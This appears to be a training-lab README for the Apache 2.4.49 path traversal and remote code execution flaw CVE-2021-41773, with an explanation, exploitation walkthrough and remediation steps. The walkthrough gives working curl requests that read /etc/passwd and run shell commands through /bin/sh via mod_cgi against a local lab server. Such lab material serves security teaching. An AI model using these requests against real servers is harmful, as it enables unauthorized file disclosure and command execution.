# Apache HTTP Server Path Traversal & Remote Code Execution (CVE-2021-41773)

## Overview

CVE-2021-41773 is a critical path traversal and remote code execution vulnerability in the Apache HTTP Server (version 2.4.49). It occurs due to a flawed path normalization logic change introduced in Apache 2.4.49.

When validating whether a requested URI path traverses outside the document root, Apache's normalization function failed to correctly parse paths containing URL-encoded characters. Specifically, an attacker could supply `.%2e/` (where the second dot is percent-encoded as `%2e`). Apache decoded this value after validation, resolving `.%2e/` to `../` and allowing arbitrary file read across the entire host filesystem. Furthermore, if `mod_cgi` is enabled (as in standard enterprise configurations), attackers can target `/cgi-bin/` to execute arbitrary operating system binaries via `POST` requests.

- **Primary Interface**: `http://localhost:8138`
- **Docker Shortcut**: `./lab start apache-traversal`
- **Container Name**: `cyberlab_02_apache_traversal`
- **RAM Footprint**: ~40 MB (Apache httpd 2.4.49)

---

## Exploitation Walkthrough

### 1. Arbitrary File Read via Path Traversal
Send a request using `.%2e/` path sequences to traverse outside DocumentRoot and read `/etc/passwd`:

```bash
curl -s --path-as-is 'http://localhost:8138/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

*Note: The `--path-as-is` flag in curl is essential to prevent the local curl client from normalizing `.%2e/` before transmitting the raw request to the server.*

### 2. Remote Code Execution via mod_cgi
Because `mod_cgi` is active on `/cgi-bin/`, you can traverse to `/bin/sh` and pass arbitrary commands via HTTP POST body:

```bash
curl -s --path-as-is -X POST 'http://localhost:8138/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh' \
  -d 'echo Content-Type: text/plain; echo; id; uname -a'
```

The server executes the shell command under daemon privileges and returns the output.

---

## Defensive Remediation & Hardening

1. **Upgrade Apache HTTP Server**:
   Upgrade immediately to Apache 2.4.51 or newer.
2. **Restrict Access by Default**:
   Enforce `Require all denied` on the root filesystem in `httpd.conf`:
   ```apache
   <Directory />
       AllowOverride none
       Require all denied
   </Directory>
   ```

---

## Video Walkthroughs & Technical References

- [Exploiting Apache 2.4.49 Vulnerability (CVE-2021-41773)](https://www.youtube.com/watch?v=DhnYtHPeu_4)
- [Bugcrowd Security Flash - Apache CVE 2021-41773](https://www.youtube.com/watch?v=x0Bk7nqeB4k)
- [Apache HTTP Server 2.4 Vulnerability Disclosure](https://httpd.apache.org/security/vulnerabilities_24.html)
- [Vulhub Apache 2.4.49 Path Traversal Advisory](https://vulhub.org/#/environments/httpd/CVE-2021-41773/)
